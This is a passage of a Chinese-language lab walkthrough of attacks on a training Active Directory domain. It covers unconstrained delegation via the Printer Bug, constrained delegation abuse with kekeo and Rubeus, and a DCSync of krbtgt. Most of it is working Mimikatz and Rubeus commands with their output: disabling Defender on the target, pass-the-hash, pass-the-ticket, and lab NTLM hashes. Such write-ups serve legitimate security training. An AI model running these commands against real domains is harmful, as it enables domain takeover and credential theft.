PS C:\ad> Find-LocalAdminAccess
dcorp-std366.dollarcorp.moneycorp.local
```

srvadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
```

由枚举结果可知，符合条件的只有appadmin

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz（这里如果不能载入，可以多试几次直接```Enter-PSSession $sess```,进去以后直接bypass掉AMSI）
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

横向到dcorp-appsrv，创建一个文件夹
```
PS C:\ad> Enter-PSSession $sess
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> mkdir user366
```

用Mimikatz导出所有令牌，看看是否有Administrator的令牌
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::tickets /export

<略>

Authentication Id : 0 ; 3929288 (00000000:003bf4c8)
Session           : Network from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 2/15/2022 6:02:00 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 2/15/2022 6:02:00 AM ; 2/15/2022 4:02:00 PM ; 2/22/2022 6:02:00 AM
           Service Name (02) : krbtgt ; DOLLARCORP.MONEYCORP.LOCAL ; @ DOLLARCORP.MONEYCORP.LOCAL
           Target Name  (--) : @ DOLLARCORP.MONEYCORP.LOCAL
           Client Name  (01) : Administrator ; @ DOLLARCORP.MONEYCORP.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             2d67ea81d9628838bac1d03a94ecaa0ac1002bff18529deb112cf2238b7a6270
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi !
<略>
```

如果上面不能取得Administrator的令牌，在学生机器执行下面这条触发，然后再用mimikatz导一次
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

如果已经可以查看到Administrator令牌，复用Administrator令牌，取得DA权限
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
```
执行成功！

测试我们现在是否有administrator权限，指定DC服务器执行whoami和hostname命令
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
dcorp\administrator
dcorp-dc
```

证明我们已经取得了DA权限

### 方法二（Printer Bug）

原理：MS-RPRN 有一项功能，允许任何域用户(已验证的用户)强制任何机器(后台运行了打印程序服务)连接到域用户选择的第二台机器，我们可以通过滥用Printer Bug错误来强制dcorp-dc连接到 dcorp-appsrv。

重新起一个appadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

回到学生机，执行下面命令

```
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```


然后在dcorp-appsrv的Rubeus.exe里，就看到了DCORP-DC的TGT
```
[*] 2/15/2022 2:50:23 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  2/14/2022 10:34:09 PM
  EndTime               :  2/15/2022 8:34:09 AM
  RenewTill             :  2/21/2022 1:00:49 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

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
```

怎么利用TGT？

利用命令：```.\Rubeus.exe ptt /ticket:<TGTofDCORP-DC$>```


导入成功

用klist命令查看ticket
```
PS C:\ad> klist

Current LogonId is 0:0x2516e

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/21/2022 2:26:00 (local)
        End Time:   2/21/2022 12:26:00 (local)
        Renew Time: 2/28/2022 2:26:00 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

因为现在我们已经有了DA权限，可以使用dcsync导出dcorp\krbtgt的NTML哈希
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```


# Learning Objective 18:
Task
● Enumerate users in the domain for whom Constrained Delegation is enabled.
− For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
− Pass the ticket and access the service.
● Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
− For such a user, request a TGT from the DC.
− Obtain an alternate TGS for LDAP service on the target machine.
− Use the TGS for executing DCSync attack.


约束委派

## Enumerate users in the domain for whom Constrained Delegation is enabled.

```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser –TrustedToAuth


logoncount               : 13
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 4/23/2020 9:31:35 AM
userprincipalname        : websvc
name                     : web svc
objectsid                : S-1-5-21-1874506631-3219952063-538504511-1113
samaccountname           : websvc
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 4/23/2020 4:31:35 PM
instancetype             : 4
usncreated               : 14488
objectguid               : 8862b451-0bc9-4b26-8ffb-65c803cc74e7
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
lastlogon                : 4/23/2020 9:31:35 AM
badpwdcount              : 0
cn                       : web svc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 2/17/2019 1:01:06 PM
primarygroupid           : 513
pwdlastset               : 2/17/2019 5:01:06 AM
usnchanged               : 425978
```

留意：```msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}```,这里表示websvc可以被利用进入dcorp-mssql的文件系统

由于我们之前已经枚举到了websvc的ntml哈希,这里直接利用

```
websvc：cc098f204c5887eaa8253e7c2749156f
```

## For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
## Pass the ticket and access the service.

### 方法一：kekeo.exe
使用kekeo的 tgt::ask模块，向websvc请求一个TGT
```
PS C:\ad> .\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with  9 modules * * */

kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
Realm        : dollarcorp.moneycorp.local (dollarcorp)
User         : websvc (websvc)
CName        : websvc   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): cc098f204c5887eaa8253e7c2749156f
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

现在我们有了TGT，向dcorp-mssql请求一个TGS。需要注意，这个TGS只有进入系统的权限，不能执行系统命令

```
kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
Ticket  : TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: websvc @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] T: [2/22/2022 12:03:49 AM ; 2/22/2022 10:03:49 AM] {R:3/1/2022 12:03:49 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): ba7c5fa059dd40fb86b20309fb226e1bad3e1f8180f09e8995825f0f1df4ba65
  [s4u2self]  Administrator@dollarcorp.moneycorp.local
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_websvc@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
Service(s):
  [s4u2proxy] cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

生成了一个TGS，使用Invoke-Mimikatz注入到内存当中
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
```

查看dcorp-mssql，看是否能列出文件列表（因为我们只有查看文件的权限）
```
PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                PerfLogs
d-r---        2/17/2019   5:19 AM                Program Files
d-----        2/17/2019   5:17 AM                Program Files (x86)
d-----        8/21/2020   4:24 AM                Transcripts
d-r---        2/17/2019   5:21 AM                Users
d-----        8/20/2020   4:02 AM                Windows
```

### 方法二：Rubeus.exe

使用rebuse滥用约束委托，可以在一条命令里请求TGT和TGS

```
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
```

查看dcorp-mssql的C盘,证明已经有进入dcorp-mssql的权限
```
PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                PerfLogs
d-r---        2/17/2019   5:19 AM                Program Files
d-----        2/17/2019   5:17 AM                Program Files (x86)
d-----        8/21/2020   4:24 AM                Transcripts
d-r---        2/17/2019   5:21 AM                Users
d-----        8/20/2020   4:02 AM                Windows
```

## Enumerate computer accounts in the domain for which Constrained Delegation is enabled.

```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainComputer –TrustedToAuth


logoncount                    : 155
badpasswordtime               : 2/18/2019 6:39:39 AM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 2/21/2022 1:05:29 PM
objectsid                     : S-1-5-21-1874506631-3219952063-538504511-1114
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : DCORP-ADMINSRV
accountexpires                : NEVER
whenchanged                   : 2/21/2022 9:05:29 PM
instancetype                  : 4
usncreated                    : 14594
objectguid                    : eda89f4e-dfec-429a-8b78-fe55624b85c9
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
serviceprincipalname          : {TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local, WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local...}
lastlogon                     : 2/22/2022 12:18:36 AM
iscriticalsystemobject        : False
usnchanged                    : 632076
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 2/17/2019 1:24:51 PM
primarygroupid                : 515
pwdlastset                    : 4/15/2019 8:55:19 AM
msds-supportedencryptiontypes : 28
name                          : DCORP-ADMINSRV
dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local

```

只有一台计算机：DCORP-ADMINSRV$

注意```msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}```

由于前面我们已经枚举到DCORP-ADMINSRV$的哈希，这里我们直接使用
```
DCORP-ADMINSRV$：5e77978a734e3a7f3895fb0fdbda3b96
```


## For such a user, request a TGT from the DC.
## Obtain an alternate TGS for LDAP service on the target machine.
## Use the TGS for executing DCSync attack.


### 方法一：kekeo.exe

请求TGT
```
PS C:\ad> .\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with  9 modules * * */

kekeo # tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
Realm        : dollarcorp.moneycorp.local (dollarcorp)
User         : DCORP-ADMINSRV$ (DCORP-ADMINSRV$)
CName        : DCORP-ADMINSRV$  [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5e77978a734e3a7f3895fb0fdbda3b96
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```


已生成一个TGT，下面命令生成一个TGS

```
kekeo # tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.m
AL
Ticket  : TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: DCORP-ADMINSRV$ @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] T: [2/22/2022 12:22:42 AM ; 2/22/2022 10:22:42 AM] {R:3/1/2022 12:22:42 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 4b01473a0d501079fdc42ad4d9d491e7e9ccfb16d114ccdcc2537c8d8a9aa0b0
  [s4u2self]  Administrator@dollarcorp.moneycorp.local
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
Service(s):
  [s4u2proxy] TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL
  [s4u2proxy] Alternative ServiceName: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi'
```


已生成一个TGS

下面命令利用mimikatz导入到内存中
```
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
执行
```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp
.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARC
ORP.MONEYCORP.LOCAL_ALT.kirbi

* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirb
i': OK
```
已把TGS导入内存

klist查看
```
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (3)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/15/2022 7:55:59 (local)
        End Time:   2/15/2022 17:53:59 (local)
        Renew Time: 2/22/2022 7:53:59 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
(略)
```


执行dcsync，导出dcorp\krbtgt的NTML哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
执行
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/16/2019 11:01:46 PM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2
```


### 方法二：Rubeus.exe

用Rubeus.exe可以一条命令生成TGT和TGS

```
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
```

klist查看
```
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (5)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
